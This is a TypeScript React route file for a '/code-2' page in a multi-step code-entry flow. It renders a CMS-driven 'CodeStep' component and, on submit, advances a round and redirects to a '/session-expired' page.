import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { CodeStep } from "@/components/nero/CodeStep";
import { advanceRound } from "@/lib/nero-flow";
import { getSiteData } from "@/lib/cms.functions";
import { buildCodeStepHead } from "@/lib/route-head";

export const Route = createFileRoute("/code-2")({
  loader: () => getSiteData(),
  head: ({ loaderData }) => buildCodeStepHead(loaderData?.content["code-2"]),
  component: CodeTwoPage,
});

function CodeTwoPage() {
  const { brand, content, extras } = Route.useLoaderData();
  const navigate = useNavigate();
  return (
    <CodeStep
      step={2}
      brand={brand}
      content={content["code-2"]}
      customCss={extras["code-2"].customCss}
      blocks={extras["code-2"].blocks}
      onSubmit={() => {
        advanceRound();
        navigate({ to: "/session-expired" });
      }}
    />
  );
}